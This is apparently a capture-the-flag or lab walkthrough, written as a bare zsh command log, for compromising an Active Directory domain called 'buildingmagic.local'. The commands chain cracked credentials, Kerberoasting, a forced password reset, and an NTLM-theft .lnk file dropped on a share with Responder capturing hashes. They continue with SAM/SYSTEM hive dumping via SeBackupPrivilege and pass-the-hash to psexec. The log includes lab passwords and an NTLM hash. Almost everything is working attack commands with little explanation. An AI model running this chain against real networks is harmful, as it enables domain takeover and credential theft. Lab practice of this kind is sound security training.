```zsh
#given a bunch of leaked creds
#md5 hashed. send it to crackstation, and it cracks 2 of them
nxc ldap 10.0.28.79 -u r.widdleton -p lilronron
nxc smb 10.0.28.79 -u r.widdleton -p lilronron --users

impacket-GetUserSPNs -dc-ip 10.0.28.79 buildingmagic.local/r.widdleton
impacket-GetUserSPNs -dc-ip 10.0.28.79 buildingmagic.local/r.widdleton -request-user r.haggard

nxc smb 10.0.28.79 -u r.haggard -p rubeushagrid

bloodhound-ce-python -u r.haggard -ns 10.0.28.79 -d buildingmagic.local -c All --zip
#shows forceChangePassword on h.potch
bloodyAD --host 10.0.28.79 -d buildingmagic.local -u r.haggard -p 'rubeushagrid' set password 'h.potch' 'newPassword1!'

nxc smb 10.0.28.79 -u h.potch -p 'newPassword1!' --shares

python /opt/ntlm_theft/ntlm_theft.py -g all -s 10.200.42.14 -f thieve

smbclient \\\\10.0.28.79\\'File-Share' -U buildingmagic.local/h.potch
put thieve.lnk

sudo responder -I tun0 -A
#hash for h.grangon

nxc winrm 10.0.28.79 -u h.grangon -p magic4ever
#pwned
evil-winrm -i 10.0.28.47 -u h.grangon -p 'magic4ever'
#seBackupPrivilege (no seRestore, nor server operators)
reg save hklm\sam sam.hive
reg save hklm\system system.hive
download sam.hive
download system.hive

impacket-secretsdump -system system.hive  -sam sam.hive -ts local
#administrator hash
#but impacket doesnt

nxc smb 10.0.28.79 -u all_users.txt -H 520126a03f5d5a8d836f1c4f34ede7ce
#a.flatch

impacket-psexec a.flatch@buildingmagic.local -hashes :520126a03f5d5a8d836f1c4f34ede7ce
```